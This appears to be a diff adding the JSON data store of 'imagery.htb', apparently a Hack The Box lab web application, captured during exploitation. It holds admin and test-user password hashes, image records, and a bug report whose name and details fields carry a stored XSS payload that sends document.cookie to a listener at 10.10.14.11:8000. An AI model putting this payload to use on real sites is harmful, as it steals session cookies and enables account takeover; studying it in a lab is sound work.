@@ -1,0 +1,76 @@
+{
+    "users": [
+        {
+            "username": "admin@imagery.htb",
+            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+            "isAdmin": true,
+            "displayId": "a1b2c3d4",
+            "login_attempts": 0,
+            "isTestuser": false,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        },
+        {
+            "username": "testuser@imagery.htb",
+            "password": "2c65c8d7bfbca32a3ed42596192384f6",
+            "isAdmin": false,
+            "displayId": "e5f6g7h8",
+            "login_attempts": 0,
+            "isTestuser": true,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        }
+    ],
+    "images": [
+        {
+            "id": "35366168-d2eb-45fc-84ee-7aeedbc17407",
+            "filename": "1db125ad-ea46-468a-b7fc-d97d582b3a31_f4e9f267-e617-4202-86c4-ca8f5088f428_etc_Batman.jpg",
+            "url": "/uploads/1db125ad-ea46-468a-b7fc-d97d582b3a31_f4e9f267-e617-4202-86c4-ca8f5088f428_etc_Batman.jpg",
+            "title": "f4e9f267-e617-4202-86c4-ca8f5088f428_etc_Batman",
+            "description": "",
+            "timestamp": "2025-10-03T04:00:43.068836",
+            "uploadedBy": "haha@haha.com",
+            "uploadedByDisplayId": "bc3acad3",
+            "group": "My Images",
+            "type": "original",
+            "actual_mimetype": "image/jpeg"
+        },
+        {
+            "id": "f6018e7e-bf1d-45c6-8d11-9e734c0c2f91",
+            "filename": "fd0be6c9-e7c0-4806-b7c1-d5802da95328_Batman.jpg",
+            "url": "/uploads/fd0be6c9-e7c0-4806-b7c1-d5802da95328_Batman.jpg",
+            "title": "iBatman/i",
+            "description": "iBatman/i",
+            "timestamp": "2025-10-03T04:08:59.818938",
+            "uploadedBy": "admin@imagery.htb",
+            "uploadedByDisplayId": "a1b2c3d4",
+            "group": "My Images",
+            "type": "original",
+            "actual_mimetype": "image/jpeg"
+        }
+    ],
+    "image_collections": [
+        {
+            "name": "My Images"
+        },
+        {
+            "name": "Unsorted"
+        },
+        {
+            "name": "Converted"
+        },
+        {
+            "name": "Transformed"
+        }
+    ],
+    "bug_reports": [
+        {
+            "id": "f96e8e88-80fa-4121-9e0a-b3c6fb6b7190",
+            "name": "img src=x onerror=\u201cnew Image().src=\u2018http://10.10.14.11:8000/?=\u2018+(document.cookie)",
+            "details": "<img src=x onerror=\u201cnew Image().src=\u2018http://10.10.14.11:8000/?=\u2018+(document.cookie)\">",
+            "reporter": "haha@haha.com",
+            "reporterDisplayId": "bc3acad3",
+            "timestamp": "2025-10-03T04:00:31.098896"
+        }
+    ]
+}
